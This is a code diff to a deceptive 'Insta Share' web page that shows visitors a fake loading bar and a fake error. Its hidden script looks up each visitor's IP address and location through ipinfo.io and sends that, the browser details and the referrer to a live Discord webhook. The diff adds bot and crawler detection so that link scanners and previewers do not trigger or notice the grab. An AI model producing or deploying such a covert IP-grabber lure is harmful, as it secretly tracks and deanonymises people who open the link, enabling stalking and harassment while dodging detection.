@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta name="robots" content="noindex, nofollow">
   <meta charset="UTF-8">
-  <title>Insta share</title>
+  <title>Insta Share</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
   <style>
     body {
       margin: 0;
@@ -61,36 +61,43 @@
   </div>
 
   <script>
-    // Log visitor info
-    const urlParams = new URLSearchParams(window.location.search);
-    const source = urlParams.get('src') || 'unknown';
+    function isLikelyBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      return navigator.webdriver ||
+        !ua ||
+        /bot|crawl|spider|preview|fetch|headless|phantom|slurp|facebookexternalhit|discordbot|twitterbot|python|wget|curl/i.test(ua) ||
+        !window.chrome && !window.outerWidth;
+    }
 
-    fetch("https://ipinfo.io/json")
-      .then(res => res.json())
-      .then(ipData => {
-        const payload = {
-          content: `
-📥 New Visitor Logged
+    if (!isLikelyBot()) {
+      const urlParams = new URLSearchParams(window.location.search);
+      const source = urlParams.get('src') || 'unknown';
+
+      fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(ipData => {
+          const payload = {
+            content: `📥 New Visitor Logged
 🌍 IP: ${ipData.ip}
 📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
 🖥️ Device: ${navigator.userAgent}
 🔗 Referrer: ${document.referrer || "none"}
 🕒 Timestamp: ${new Date().toISOString()}
-🎯 Source: ${source}
-          `
-        };
+🎯 Source: ${source}`
+          };
 
-        fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
         });
-      });
+    }
 
-    // Fake progress
+    // Show fake error after loading bar
     setTimeout(() => {
       document.getElementById('errorMessage').style.display = 'block';
-    }, 4200); // Show error after bar fills
+    }, 4200);
   </script>
 </body>
 </html>
